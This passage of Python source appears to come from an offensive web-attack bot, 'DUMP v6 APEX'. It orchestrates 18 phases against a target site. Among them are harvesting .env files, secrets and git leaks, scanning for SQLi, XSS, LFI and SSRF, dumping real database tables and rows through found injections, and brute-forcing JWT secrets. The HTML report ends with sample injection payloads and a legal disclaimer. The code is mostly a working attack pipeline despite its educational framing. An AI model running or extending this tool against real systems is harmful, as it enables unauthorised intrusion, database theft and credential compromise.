                        obf["base64_strings"] > 2, obf["unicode_strings"] > 3]):
                    obf["url"] = u
                    self.summary["js_obfuscation"].append(obf)
                sm_match = re.search(r'//[#@]\s*sourceMappingURL=([^\s]+)', text)
                if sm_match:
                    sm_url = urljoin(u, sm_match.group(1))
                    sm_p, _, _ = self.download(sm_url, "sourcemaps", scan=True)
                    if sm_p:
                        self.summary["sourcemaps"].append({
                            "url": sm_url,
                            "file": os.path.relpath(sm_p, self.output_dir),
                            "size": os.path.getsize(sm_p)})
                if depth < JS_DEPTH:
                    new_js = set()
                    for m in re.finditer(r'["\']([^"\']+\.js)["\']', text):
                        sub = urljoin(u, m.group(1))
                        if is_internal(sub, self.origin) and sub not in self.visited_js:
                            new_js.add(sub)
                    if new_js:
                        self.download_recursive_js(new_js, depth + 1)

    def fetch_robots(self):
        try:
            r = self.session.get(f"{self.origin}/robots.txt",
                                 headers=build_headers(self.origin), timeout=10,
                                 allow_redirects=False)
            if r.status_code == 200 and "text" in r.headers.get("content-type", "").lower():
                save(os.path.join(self.output_dir, "robots.txt"), r.text)
                self.summary["robots"] = {"url": f"{self.origin}/robots.txt",
                                         "content": r.text[:2000]}
        except Exception:
            pass

    def fetch_sitemap(self):
        try:
            r = self.session.get(f"{self.origin}/sitemap.xml",
                                 headers=build_headers(self.origin), timeout=10,
                                 allow_redirects=False)
            if r.status_code == 200:
                save(os.path.join(self.output_dir, "sitemap.xml"), r.text)
                self.summary["sitemap"] = {"url": f"{self.origin}/sitemap.xml",
                                          "size": len(r.content)}
        except Exception:
            pass

    def scan_cves(self):
        if not CVE_LOOKUP_ENABLED:
            return
        self.notify("🎯 <b>CVE Lookup...</b>")
        versions = self.summary.get("versions", {})
        all_cves = []
        for product, version in versions.items():
            cves = lookup_cves(product, version, max_results=5)
            for c in cves:
                c["product"] = product
                c["version"] = version
                all_cves.append(c)
        self.summary["cves"] = all_cves
        if all_cves:
            self.notify(f"🎯 <b>{len(all_cves)} CVE(s) potentielle(s)</b>")

    def scan_jwt_bruteforce(self):
        if not JWT_BRUTE_ENABLED:
            return
        jwts = self.summary.get("jwts", [])
        if not jwts:
            return
        self.notify(f"🔑 <b>JWT brute-force ({len(jwts)})...</b>")
        cracked = []
        for j in jwts[:10]:
            result = jwt_bruteforce(j["token"])
            if result and result.get("found"):
                j["cracked"] = result
                cracked.append(j)
        if cracked:
            self.notify(f"🚨 <b>{len(cracked)} JWT cassé(s) !</b>")

    def scan_ssrf(self):
        self.summary["ssrf_findings"] = run_ssrf_scan(self.url, notify_fn=self.notify)

    def detect_webshells(self):
        self.notify("🕸️ <b>Détection web shells...</b>")
        shells = detect_webshells(self.downloaded_files)
        self.summary["webshells"] = shells
        if shells:
            self.notify(f"💀 <b>{len(shells)} web shell(s) !</b>")

    def run_db_dump(self, sqli_findings):
        if not DB_DUMP_ENABLED or not sqli_findings:
            return []
        self.notify("🔬 <b>DB DUMP RÉEL...</b>")
        results = run_db_dump_on_findings(sqli_findings, notify_fn=self.notify)
        self.summary["db_dump_results"] = results
        total_tables = sum(len(r.get("tables", [])) for r in results)
        total_rows = sum(sum(len(t.get("rows", [])) for t in r.get("tables_dump", {}).values())
                        for r in results)
        if total_tables:
            self.notify(f"💥 <b>DB DUMP : {total_tables} table(s), {total_rows} ligne(s) !</b>")
        return results

    def compute_risk(self):
        risk = compute_risk_score(self.summary)
        self.summary["risk"] = risk
        grade = risk["grade"]
        emoji = {"A": "🟢", "B": "🟢", "C": "🟡", "D": "🟠",
                 "E": "🔴", "F": "💀"}.get(grade, "⚪")
        self.notify(f"{emoji} <b>Score : {grade} ({risk['score']}/100)</b>")

    def generate_html_report(self):
        s = self.summary
        risk = s.get("risk", {})
        grade = risk.get("grade", "?")
        score = risk.get("score", 0)
        grade_color = {"A": "#3fb950", "B": "#3fb950", "C": "#d29922",
                       "D": "#f0883e", "E": "#f85149", "F": "#f85149"}.get(grade, "#58a6ff")

        db_dump = s.get("db_dump_results", [])
        db_tables = sum(len(r.get("tables", [])) for r in db_dump)
        db_rows = sum(sum(len(t.get("rows", [])) for t in r.get("tables_dump", {}).values())
                     for r in db_dump)

        html = f"""<!DOCTYPE html>
<html lang="fr"><head>
<meta charset="utf-8">
<title>Rapport v6 APEX — {s['target']}</title>
<style>
body{{font-family:system-ui,sans-serif;background:#0d1117;color:#c9d1d9;padding:20px;max-width:1200px;margin:auto}}
h1{{color:#58a6ff}}h2{{color:#79c0ff;border-bottom:1px solid #30363d;padding-bottom:6px;margin-top:30px}}
.warn{{background:#3d1a1a;border-left:4px solid #f85149;padding:12px;margin:10px 0;border-radius:4px}}
.ok{{background:#0d2618;border-left:4px solid #3fb950;padding:12px;margin:10px 0;border-radius:4px}}
.info{{background:#0d1a26;border-left:4px solid #58a6ff;padding:12px;margin:10px 0;border-radius:4px}}
code{{background:#161b22;padding:2px 6px;border-radius:4px;color:#f0f6fc;font-size:0.9em;word-break:break-all}}
pre{{background:#161b22;padding:10px;border-radius:4px;overflow:auto;font-size:0.85em}}
table{{width:100%;border-collapse:collapse;margin:10px 0}}
td,th{{padding:8px;text-align:left;border-bottom:1px solid #30363d;font-size:0.9em}}
th{{background:#161b22;color:#79c0ff}}
.stat{{display:inline-block;background:#161b22;padding:12px 20px;border-radius:8px;margin:6px;border-left:4px solid #58a6ff}}
.stat b{{font-size:1.8em;color:#58a6ff;display:block}}
.score{{text-align:center;padding:30px;background:#161b22;border-radius:12px;margin:20px 0;border:2px solid {grade_color}}}
.score .grade{{font-size:5em;font-weight:bold;color:{grade_color}}}
.score .num{{font-size:1.5em;color:#8b949e}}
</style></head><body>
<h1>📦 Rapport v6 APEX — DUMP BOT</h1>
<p><b>Cible :</b> <code>{s['target']}</code></p>
<p><b>Date :</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
<p><b>Durée :</b> {self._duration()}s</p>

<div class="score">
<div class="grade">{grade}</div>
<div class="num">{score}/100 — Score de risque</div>
</div>
"""
        html += "<h2>📊 Statistiques</h2><div>"
        stats_items = [
            ("HTML", len(s['html'])), ("JS", len(s['js'])), ("CSS", len(s['css'])),
            ("Iframes", len(s['iframes'])), ("Images", len(s['images'])),
            ("SourceMaps", len(s['sourcemaps'])), ("Crawl", len(s['crawled_pages'])),
            ("PHP source", len(s['php_source'])), ("PHP backup", len(s['php_backup'])),
            ("Sensibles", len(s['sensitive_found'])), ("Secrets", len(s['secrets'])),
            ("APIs", len(s['api_endpoints'])), ("WebSockets", len(s['websockets'])),
            ("Backups SQL", len(s.get('db_backups', []))),
            ("Outils admin", len(s.get('db_admin_tools', []))),
            ("Git leaks", len(s.get('git_leaks', []))),
            ("Subdomains", len(s.get('subdomains', []))),
            ("SQLi", len(s.get('sqli_findings', []))),
            ("XSS", len(s.get('xss_findings', []))),
            ("LFI", len(s.get('lfi_findings', []))),
            ("SSRF", len(s.get('ssrf_findings', []))),
            ("CVE", len(s.get('cves', []))),
            ("JWT", len(s.get('jwts', []))),
            ("DB tables", db_tables), ("DB rows", db_rows),
            ("Webshells", len(s.get('webshells', []))),
        ]
        for name, val in stats_items:
            html += f'<div class="stat"><b>{val}</b>{name}</div>'
        html += "</div>"

        if s.get("waf"):
            html += "<h2>🛡️ WAF détecté</h2><div class='info'>"
            for w in s["waf"]:
                html += f"<code>{w}</code> "
            html += "</div>"

        fp = s.get("fingerprint", {})
        if fp:
            html += "<h2>🔍 Fingerprint</h2><table>"
            for k, v in fp.items():
                if isinstance(v, list):
                    v = ", ".join(v)
                html += f"<tr><th>{k}</th><td><code>{v or 'N/A'}</code></td></tr>"
            html += "</table>"

        if s.get("versions"):
            html += "<h2>📌 Versions détectées</h2><table>"
            for prod, ver in s["versions"].items():
                html += f"<tr><th>{prod}</th><td><code>{ver}</code></td></tr>"
            html += "</table>"

        if s.get("headers"):
            html += "<h2>📋 Headers HTTP</h2><table>"
            for k, v in s["headers"].items():
                html += f"<tr><th>{k}</th><td><code>{v[:150]}</code></td></tr>"
            html += "</table>"

        if s.get("cors"):
            cls = "warn" if s["cors"].get("dangerous") else "info"
            html += f"<h2>🌐 CORS</h2><div class='{cls}'><pre>{json.dumps(s['cors'], indent=2)}</pre></div>"

        if s.get("cookies_analysis"):
            html += "<h2>🍪 Cookies</h2><table><tr><th>Nom</th><th>Secure</th><th>HttpOnly</th><th>SameSite</th><th>Issues</th></tr>"
            for c in s["cookies_analysis"]:
                html += f"<tr><td><code>{c['name']}</code></td><td>{'✅' if c['secure'] else '❌'}</td><td>{'✅' if c['httponly'] else '❌'}</td><td>{c['samesite'] or '❌'}</td><td>{', '.join(c['issues'])}</td></tr>"
            html += "</table>"

        if s.get("secrets"):
            html += f"<h2>🔐 Secrets ({len(s['secrets'])})</h2>"
            for sec in s["secrets"][:50]:
                html += f"<div class='warn'>🚨 <b>{sec['type']}</b> dans <code>{sec['url'][:100]}</code><br><code>{sec['value']}</code>"
                if sec.get("jwt_decoded"):
                    html += f"<pre>{json.dumps(sec['jwt_decoded'], indent=2)[:500]}</pre>"
                html += "</div>"

        if s.get("jwts"):
            html += f"<h2>🔑 JWT ({len(s['jwts'])})</h2>"
            for j in s["jwts"][:20]:
                cls = "warn" if j.get("cracked") else "info"
                html += f"<div class='{cls}'>🎫 <code>{j['token'][:80]}</code><br>"
                if j.get("decoded"):
                    html += f"<pre>{json.dumps(j['decoded'], indent=2)[:400]}</pre>"
                if j.get("cracked"):
                    html += f"💥 <b>CASSÉ :</b> <code>{j['cracked']['secret']}</code>"
                html += "</div>"

        if s.get("cves"):
            html += f"<h2>🎯 CVE ({len(s['cves'])})</h2>"
            critical = [c for c in s["cves"] if c.get("score") and c["score"] >= 7.0]
            if critical:
                html += f"<div class='warn'><b>🚨 {len(critical)} CVE critiques</b></div>"
            for c in s["cves"][:40]:
                cls = "warn" if c.get("score") and c["score"] >= 7.0 else "info"
                html += f"<div class='{cls}'><b>{c['id']}</b> ({c.get('score','?')} {c.get('severity','')}) — {c.get('product','')} {c.get('version','')}<br><small>{c.get('description','')[:300]}</small></div>"

        if s.get("sqli_findings"):
            html += f"<h2>💉 SQLi ({len(s['sqli_findings'])})</h2>"
            for f in s["sqli_findings"]:
                html += f"<div class='warn'>💥 <b>{f['type']}</b> — <code>{f['param']}</code><br>URL : <code>{f.get('url','')[:120]}</code><br>Payload : <code>{f.get('payload', f.get('payload_true',''))[:150]}</code><br>Preuve : <code>{f.get('evidence','')[:200]}</code></div>"

        if db_dump:
            html += f"<h2>💥 DB DUMP — {db_tables} table(s), {db_rows} ligne(s)</h2>"
            for r in db_dump:
                html += f"<div class='warn'><b>🎯 {r['param']}</b> @ <code>{r['url'][:100]}</code><br>"
                html += f"SGBD : <b>{r.get('db_type','?')}</b> | Colonnes : <b>{r.get('num_columns','?')}</b><br>"
                html += f"Tables : <code>{', '.join(r.get('tables', [])[:20])}</code>"
                if r.get("users"):
                    html += f"<br>Users DB : <code>{', '.join(r['users'][:10])}</code>"
                if r.get("file_reads"):
                    for fr in r["file_reads"]:
                        html += f"<br>📂 <b>{fr['path']}</b> :<pre>{fr['content'][:300]}</pre>"
                html += "</div>"
                # Détail par table
                for table, data in r.get("tables_dump", {}).items():
                    html += f"<h3>📋 {table}</h3>"
                    html += f"<p>Colonnes : <code>{', '.join(data['columns'])}</code></p>"
                    if data["rows"]:
                        html += "<table><tr>"
                        for c in data["columns"][:10]:
                            html += f"<th>{c}</th>"
                        html += "</tr>"
                        for row in data["rows"][:50]:
                            html += "<tr>"
                            for cell in row[:10]:
                                html += f"<td><code>{str(cell)[:80]}</code></td>"
                            html += "</tr>"
                        html += "</table>"

        if s.get("xss_findings"):
            html += f"<h2>🎭 XSS ({len(s['xss_findings'])})</h2>"
            for f in s["xss_findings"][:30]:
                html += f"<div class='warn'>💥 <code>{f['url'][:100]}</code> — param <code>{f['param']}</code><br>Payload : <code>{f['payload'][:150]}</code></div>"

        if s.get("lfi_findings"):
            html += f"<h2>📂 LFI ({len(s['lfi_findings'])})</h2>"
            for f in s["lfi_findings"][:20]:
                html += f"<div class='warn'>💥 <code>{f['url'][:100]}</code> — <code>{f['param']}</code><br>Payload : <code>{f['payload'][:120]}</code><br>Preuve : <code>{f.get('evidence','')[:100]}</code></div>"

        if s.get("ssrf_findings"):
            html += f"<h2>🌐 SSRF ({len(s['ssrf_findings'])})</h2>"
            for f in s["ssrf_findings"][:20]:
                html += f"<div class='warn'>💥 <code>{f.get('url','')[:100]}</code> — <code>{f['param']}</code><br>Payload : <code>{f['payload'][:120]}</code><br>Preuve : <code>{f.get('evidence','')[:100]}</code></div>"

        if s.get("webshells"):
            html += f"<h2>💀 Web Shells ({len(s['webshells'])})</h2>"
            for w in s["webshells"]:
                html += f"<div class='warn'>💀 <code>{w['file']}</code> → {w['shell']}</div>"

        if s.get("git_leaks"):
            html += f"<h2>💀 Fuites VCS ({len(s['git_leaks'])})</h2>"
            for g in s["git_leaks"]:
                html += f"<div class='warn'>💀 <code>{g['url']}</code> ({g['size']} bytes)</div>"

        if s.get("db_backups"):
            html += f"<h2>🗄️ Backups SQL exposés ({len(s['db_backups'])})</h2>"
            for b in s["db_backups"]:
                cls = "warn" if b["severity"] == "CRITICAL" else "info"
                html += f"<div class='{cls}'>💥 <code>{b['url']}</code> ({b['size']} bytes, {b['severity']})</div>"

        if s.get("db_admin_tools"):
            html += f"<h2>🛠️ Outils admin ({len(s['db_admin_tools'])})</h2>"
            for t in s["db_admin_tools"]:
                html += f"<div class='warn'>⚠️ <code>{t['url']}</code> [HTTP {t['status']}] {t['title']}</div>"

        if s.get("subdomains"):
            html += f"<h2>🕵️ Sous-domaines ({len(s['subdomains'])})</h2><div class='info'>"
            for sub in s["subdomains"][:100]:
                html += f"<code>{sub}</code><br>"
            html += "</div>"

        if s.get("api_discovery"):
            html += f"<h2>🌐 APIs découvertes ({len(s['api_discovery'])})</h2><table><tr><th>URL</th><th>Type</th><th>Status</th><th>Titre</th></tr>"
            for a in s["api_discovery"][:50]:
                html += f"<tr><td><code>{a['url'][:100]}</code></td><td>{a.get('type','')}</td><td>{a['status']}</td><td>{a.get('title','')[:50]}</td></tr>"
            html += "</table>"

        if s.get("js_obfuscation"):
            html += f"<h2>🔓 JS obfusqués ({len(s['js_obfuscation'])})</h2>"
            for o in s["js_obfuscation"][:20]:
                html += f"<div class='info'>📦 <code>{o['url'][:100]}</code><br>"
                html += f"Packer: {o['packer_detected']} | Hex: {o['hex_strings']} | B64: {o['base64_strings']} | Unicode: {o['unicode_strings']}"
                if o.get("decoded_b64"):
                    html += f"<br>Décodé: <code>{o['decoded_b64'][0][:100]}</code>"
                html += "</div>"

        if s.get("api_endpoints"):
            html += f"<h2>🎯 Endpoints API ({len(s['api_endpoints'])})</h2><table><tr><th>URL</th><th>Type</th></tr>"
            for api in s["api_endpoints"][:80]:
                html += f"<tr><td><code>{api['url'][:120]}</code></td><td>{api.get('type','')}</td></tr>"
            html += "</table>"

        if s.get("websockets"):
            html += f"<h2>🔌 WebSockets ({len(s['websockets'])})</h2>"
            for ws in s["websockets"][:30]:
                html += f"<div class='info'>🔌 <code>{ws['url'][:120]}</code></div>"

        for it in s.get("sensitive_found", []):
            if it.get("env_analysis"):
                html += f"<h2>🔴 .env EXPOSÉ — <code>{it['url']}</code></h2><table>"
                for k, v in it["env_analysis"].items():
                    html += f"<tr><th>{k}</th><td><code>{v}</code></td></tr>"
                html += "</table>"

        if s["sensitive_found"] or s["php_backup"]:
            html += "<h2>🚨 Alerte Sécurité</h2>"
            for it in s["php_backup"][:30]:
                html += f"<div class='warn'>💥 Backup : <code>{it['url'][:120]}</code></div>"
            for it in s["sensitive_found"][:30]:
                html += f"<div class='warn'>🚨 Sensible : <code>{it['url'][:120]}</code></div>"

        html += self._education_section()
        html += "</body></html>"
        save(os.path.join(self.output_dir, "REPORT.html"), html)

    def _education_section(self):
        return """
<h2>📚 Comprendre les risques (éducatif)</h2>

<div class="info">
<b>🔍 Injection SQL</b> : envoi de code SQL via un formulaire/URL pour manipuler la BDD.
Exemple <b>théorique</b> : <code>SELECT * FROM users WHERE id = '$input'</code>
sans protection → envoyer <code>1 OR 1=1</code> retourne tous les utilisateurs.
</div>

<div class="info">
<b>🧪 Techniques de détection utilisées :</b>
<ol>
<li><b>Error-based</b> : injecter un caractère cassant la syntaxe et chercher un message d'erreur SQL.</li>
<li><b>Boolean-based</b> : comparer <code>AND 1=1</code> vs <code>AND 1=2</code> avec double vérification.</li>
<li><b>Time-based</b> : injecter <code>SLEEP(5)</code> et mesurer le délai.</li>
<li><b>UNION-based</b> (DB Dump) : extraire les données via <code>UNION SELECT</code>.</li>
</ol>
<b>XSS</b> : injecter <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> et vérifier s'il est reflété non échappé.<br>
<b>LFI</b> : injecter <code>../../../etc/passwd</code> et chercher <code>root:x:</code>.<br>
<b>SSRF</b> : injecter des URLs internes (metadata cloud, localhost).
</div>

<div class="ok">
<b>✅ Comment se protéger :</b>
<ol>
<li><b>Requêtes préparées</b> (PDO, mysqli, PreparedStatement)</li>
<li><b>Validation/échappement</b> des entrées (htmlspecialchars pour XSS)</li>
<li><b>Principe du moindre privilège</b> pour la BDD</li>
<li><b>WAF</b> (Cloudflare, ModSecurity)</li>
<li><b>Ne jamais exposer</b> .env, backups, .git, phpMyAdmin</li>
<li><b>Headers de sécurité</b> : CSP, HSTS, X-Frame-Options</li>
<li><b>Cookies</b> : Secure + HttpOnly + SameSite</li>
<li><b>Mettre à jour</b> les dépendances (CVE lookup)</li>
</ol>
</div>

<div class="warn">
<b>🚨 Rappels légaux :</b><br>
Ce scan doit être effectué <b>UNIQUEMENT</b> sur des cibles que tu possèdes ou
pour lesquelles tu as une <b>autorisation écrite</b>. Scanner un site tiers
sans autorisation est <b>illégal</b> (art. 323-1 du Code pénal en France,
CFAA aux USA, etc.).<br><br>
Pour t'entraîner : <b>PortSwigger Web Security Academy</b>, <b>DVWA</b>,
<b>bWAPP</b>, <b>HackTheBox</b>, <b>TryHackMe</b>.
</div>
"""

    def _duration(self):
        try:
            return int((datetime.fromisoformat(self.summary["finished"]) -
                       datetime.fromisoformat(self.summary["started"])).total_seconds())
        except Exception:
            return 0

    def run(self):
        os.makedirs(self.output_dir, exist_ok=True)
        try:
            self._run()
        except Exception as e:
            self.notify(f"❌ <b>Erreur :</b>\n<code>{str(e)[:300]}</code>")
            traceback.print_exc()

    def _run(self):
        self.status(f"🚀 <b>DUMP v6 APEX</b>\n🌐 <code>{self.url[:80]}</code>")
        log(f"[1/18] Page initiale : {self.url}")

        # === Phase 1 ===
        try:
            r = self.session.get(self.url, headers=build_headers(self.url),
                                 timeout=20, allow_redirects=True)
            if r.status_code != 200:
                self.notify(f"❌ HTTP {r.status_code}")
                return
            self.analyze_headers(r)
            self.summary["waf"] = detect_waf(r)
            if self.summary["waf"]:
                self.notify(f"🛡️ WAF : <code>{', '.join(self.summary['waf'])}</code>")
            self.summary["cookies_analysis"] = self.analyze_cookies(r.cookies)
            save(os.path.join(self.output_dir, "index.html"), r.text)
            self.stats["ok"] += 1
            self.stats["bytes"] += len(r.content)
            self.summary["html"].append({"url": self.url, "file": "index.html",
                                        "size": len(r.content)})
            html, base_url = r.text, r.url
            self.fingerprint_html(html)
            self.summary["versions"] = detect_versions(html, dict(r.headers))
            cookies = r.cookies.get_dict()
            if cookies:
                save(os.path.join(self.output_dir, "cookies.json"),
                     json.dumps(cookies, indent=2))
            self.summary["secrets"].extend(self.scan_secrets(html, base_url))
            self.scan_apis(html, base_url)
        except Exception as e:
            self.notify(f"❌ {e}")
            return

        # === Phase 2 ===
        log("[2/18] Extraction...")
        js_urls = set(); css_urls = set(); iframe_urls = set()
        img_urls = set(); other_urls = set(); php_urls = set()
        for m in RE_JS_SRC.finditer(html):
            js_urls.add(urljoin(base_url, m.group(1)))
        for m in RE_LINK.finditer(html):
            u = urljoin(base_url, m.group(1))
            if ".css" in u.lower():
                css_urls.add(u)
        for m in RE_IFRAME.finditer(html):
            iframe_urls.add(urljoin(base_url, m.group(1)))
        for m in RE_IMG.finditer(html):
            img_urls.add(urljoin(base_url, m.group(1)))
        for m in RE_ANY_URL.finditer(html):
            u = urljoin(base_url, m.group(1))
            if u not in js_urls and u not in css_urls:
                other_urls.add(u)
        for m in RE_PHP.finditer(html):
            php_urls.add(urljoin(base_url, m.group(1)))
        for m in RE_PHP_ANY.finditer(html):
            php_urls.add(urljoin(base_url, m.group(1)))
        self.notify(f"🔍 <b>Extraction</b>\n📜 JS: <code>{len(js_urls)}</code> 🎨 CSS: <code>{len(css_urls)}</code>\n🖼️ Imgs: <code>{len(img_urls)}</code> 📦 Autres: <code>{len(other_urls)}</code>\n🔥 PHP: <code>{len(php_urls)}</code>")

        # === Phase 3 ===
        log("[3/18] JS récursif...")
        self.download_recursive_js(js_urls)
        self.notify(f"✅ JS : <code>{len(self.summary['js'])}</code>")

        # === Phase 4 ===
        log("[4/18] CSS...")
        for u in sorted(css_urls):
            self.progress()
            p, _, _ = self.download(u, "css", scan=True)
            if p:
                self.summary["css"].append({"url": u,
                    "file": os.path.relpath(p, self.output_dir),
                    "size": os.path.getsize(p)})

        # === Phase 5 ===
        log("[5/18] Iframes...")
        for u in sorted(iframe_urls):
            self.progress()
            p, c, _ = self.download(u, "iframes", scan=True)
            if p:
                self.summary["iframes"].append({"url": u,
                    "file": os.path.relpath(p, self.output_dir),
                    "size": os.path.getsize(p)})
                if c:
                    try:
                        txt = c.decode("utf-8", errors="ignore")
                        for m in RE_JS_SRC.finditer(txt):
                            sub = urljoin(u, m.group(1))
                            if sub not in self.visited_js:
                                p2, _, _ = self.download(sub, "js_iframe", scan=True)
                                if p2:
                                    self.summary["js"].append({"url": sub,
                                        "file": os.path.relpath(p2, self.output_dir),
                                        "size": os.path.getsize(p2)})
                        for m in RE_PHP.finditer(txt):
                            php_urls.add(urljoin(u, m.group(1)))
                    except Exception:
                        pass

        # === Phase 6 ===
        log("[6/18] PHP...")
        php_candidates = set(php_urls)
        for u in list(php_urls)[:40]:
            for suf in PHP_BACKUP_SUFFIXES[1:]:
                php_candidates.add(u + suf)
        if php_candidates:
            self.notify(f"🔥 PHP : <code>{len(php_candidates)}</code>")
            for u in sorted(php_candidates):
                self.progress()
                p, _, _ = self.download(u, "php", check_php=True, scan=True)
                if p:
                    is_backup = any(u.endswith(suf) for suf in PHP_BACKUP_SUFFIXES[1:] if suf)
                    entry = {"url": u, "file": os.path.relpath(p, self.output_dir),
                             "size": os.path.getsize(p)}
                    if is_backup:
                        self.summary["php_backup"].append(entry)
                    else:
                        self.summary["php_source"].append(entry)

        # === Phase 7 ===
        log("[7/18] Fichiers sensibles...")
        for u in {urljoin(self.origin + "/", f) for f in SENSITIVE_FILES}:
            self.progress()
            try:
                time.sleep(DOWNLOAD_DELAY)
                r = self.session.get(u, headers=build_headers(u), timeout=8,
                                     allow_redirects=False)
                if r.status_code == 200 and len(r.content) > 10:
                    ct = r.headers.get("content-type", "")
                    if "text/html" in ct and len(r.content) > 5000:
                        continue
                    if "404" in r.text[:500] and "not found" in r.text[:500].lower():
                        continue
                    name = filename_from_url(u, ".txt")
                    path = os.path.join(self.output_dir, "sensitive", name)
                    os.makedirs(os.path.dirname(path), exist_ok=True)
                    with open(path, "wb") as f:
                        f.write(r.content)
                    self.downloaded_files.append((
                        os.path.relpath(path, self.output_dir),
                        r.text[:50000]))
                    self.summary["sensitive_found"].append({
                        "url": u, "file": os.path.relpath(path, self.output_dir),
                        "size": len(r.content)})
                    self.summary["secrets"].extend(self.scan_secrets(r.text, u))
            except Exception:
                pass
        if self.summary["sensitive_found"]:
            self.notify(f"🚨 <b>{len(self.summary['sensitive_found'])} sensible(s)</b>")

        # === Phase 8 ===
        log("[8/18] Robots/Crawl...")
        self.fetch_robots()
        self.fetch_sitemap()
        self.crawl_site(base_url, html)

        # === Phase 9 ===
        log("[9/18] Git/Subdomains/API...")
        self.summary["git_leaks"] = scan_git_leaks(self.origin,
                                                    build_headers(self.origin),
                                                    self.session)
        if SUBDOMAIN_ENUM:
            try:
                domain = urlparse(self.origin).netloc.split(":")[0]
                self.summary["subdomains"] = enum_subdomains(domain)
            except Exception as e:
                log(f"Subdomain error: {e}", "ERROR")
        self.summary["api_discovery"] = discover_apis(self.origin, self.session)

        # === Phase 10 ===
        log("[10/18] BDD défensif...")
        self.summary["db_backups"] = scan_db_backups(self.origin,
                                                      build_headers(self.origin),
                                                      self.session)
        self.summary["db_admin_tools"] = scan_db_admin_tools(self.origin,
                                                              build_headers(self.origin),
                                                              self.session)

        # === Phase 11 ===
        log("[11/18] Webshell detection...")
        self.detect_webshells()

        # === Phase 12 ===
        log("[12/18] SQLi scan...")
        try:
            self.summary["sqli_findings"] = run_sqli_scan(self.url, notify_fn=self.notify)
        except Exception as e:
            log(f"SQLi error: {e}", "ERROR")

        # === Phase 13 : DB DUMP ===
        log("[13/18] DB DUMP réel...")
        try:
            self.run_db_dump(self.summary["sqli_findings"])
        except Exception as e:
            log(f"DB dump error: {e}", "ERROR")

        # === Phase 14 ===
        log("[14/18] XSS/LFI/SSRF...")
        try:
            self.summary["xss_findings"] = run_xss_scan(self.url, notify_fn=self.notify)
            self.summary["lfi_findings"] = run_lfi_scan(self.url, notify_fn=self.notify)
            self.scan_ssrf()
        except Exception as e:
            log(f"XSS/LFI/SSRF error: {e}", "ERROR")

        # === Phase 15 ===
        log("[15/18] JWT brute-force...")
        self.scan_jwt_bruteforce()

        # === Phase 16 ===
        log("[16/18] CVE lookup...")
        self.scan_cves()

        # === Phase 17 ===
        log("[17/18] Images/Autres...")
        for u in sorted(img_urls)[:MAX_IMG]:
            self.progress()
            p, _, _ = self.download(u, "img")
            if p:
                self.summary["images"].append({"url": u,
                    "file": os.path.relpath(p, self.output_dir),
                    "size": os.path.getsize(p)})
        for u in sorted(other_urls)[:MAX_OTHER]:
            self.progress()
            p, _, _ = self.download(u, "other", scan=True)
            if p:
                self.summary["other"].append({"url": u,
                    "file": os.path.relpath(p, self.output_dir),
                    "size": os.path.getsize(p)})

        # === Phase 18 ===
        log("[18/18] Rapport...")
        self.compute_risk()
        self.summary["finished"] = datetime.now().isoformat()
        self.summary["stats"] = self.stats

        if self.summary.get("db_dump_results"):
            save(os.path.join(self.output_dir, "db_dump.json"),
                 json.dumps(self.summary["db_dump_results"], indent=2,
                            ensure_ascii=False, default=str))

        save(os.path.join(self.output_dir, "SUMMARY.json"),
             json.dumps(self.summary, indent=2, ensure_ascii=False, default=str))
        self.generate_html_report()

        pdf_ok = False
        if PDF_EXPORT_ENABLED:
            html_path = os.path.join(self.output_dir, "REPORT.html")
            pdf_path = os.path.join(self.output_dir, "REPORT.pdf")
            pdf_ok = export_report_to_pdf(html_path, pdf_path)
            if pdf_ok:
                self.notify("📄 PDF généré !")

        self.notify("🗜️ Création ZIPs...")
        all_zips = self._create_zips()

        try:
            HistoryDB().add({
                "url": self.url, "started": self.summary["started"],
                "finished": self.summary["finished"], "duration": self._duration(),
                "files": self.stats["ok"], "size_mb": self.stats["bytes"] / 1024 / 1024,
                "secrets": len(self.summary["secrets"]),
                "sqli": len(self.summary["sqli_findings"]),
                "xss": len(self.summary["xss_findings"]),
                "lfi": len(self.summary["lfi_findings"]),
                "ssrf": len(self.summary["ssrf_findings"]),
                "db_tables": sum(len(r.get("tables", []))
                                for r in self.summary.get("db_dump_results", [])),
                "db_rows": sum(sum(len(t.get("rows", []))
                                  for t in r.get("tables_dump", {}).values())
                              for r in self.summary.get("db_dump_results", [])),
                "cves": len(self.summary.get("cves", [])),
                "risk_score": self.summary["risk"].get("grade", "?"),
                "waf": ",".join(self.summary.get("waf", [])),
                "report": "REPORT.html"})
        except Exception as e:
            log(f"DB save error: {e}", "ERROR")

        grade = self.summary["risk"].get("grade", "?")
        db_dump = self.summary.get("db_dump_results", [])
        db_tables = sum(len(r.get("tables", [])) for r in db_dump)
        db_rows = sum(sum(len(t.get("rows", [])) for t in r.get("tables_dump", {}).values())
                     for r in db_dump)
        jwt_cracked = sum(1 for j in self.summary.get("jwts", []) if j.get("cracked"))

        msg = (
            f"✅ <b>DUMP v6 APEX TERMINÉ</b>\n"
            f"⏱️ <code>{self._duration()}s</code>\n"
            f"🎯 <b>Score : {grade} ({self.summary['risk'].get('score', 0)}/100)</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"📄 HTML: <code>{len(self.summary['html'])}</code> "
            f"📜 JS: <code>{len(self.summary['js'])}</code> "
            f"🗺️ SM: <code>{len(self.summary['sourcemaps'])}</code>\n"
            f"🕸️ Crawl: <code>{len(self.summary['crawled_pages'])}</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"🚨 Sensibles: <code>{len(self.summary['sensitive_found'])}</code>\n"
            f"🔐 Secrets: <code>{len(self.summary['secrets'])}</code>\n"
            f"💀 Git leaks: <code>{len(self.summary['git_leaks'])}</code>\n"
            f"🕵️ Subdomains: <code>{len(self.summary['subdomains'])}</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"🗄️ Backups SQL: <code>{len(self.summary['db_backups'])}</code>\n"
            f"🛠️ Outils admin: <code>{len(self.summary['db_admin_tools'])}</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"💉 SQLi: <code>{len(self.summary['sqli_findings'])}</code> "
            f"🎭 XSS: <code>{len(self.summary['xss_findings'])}</code>\n"
            f"📂 LFI: <code>{len(self.summary['lfi_findings'])}</code> "
            f"🌐 SSRF: <code>{len(self.summary['ssrf_findings'])}</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔥 <b>DB DUMP : {db_tables} table(s), {db_rows} ligne(s)</b>\n"
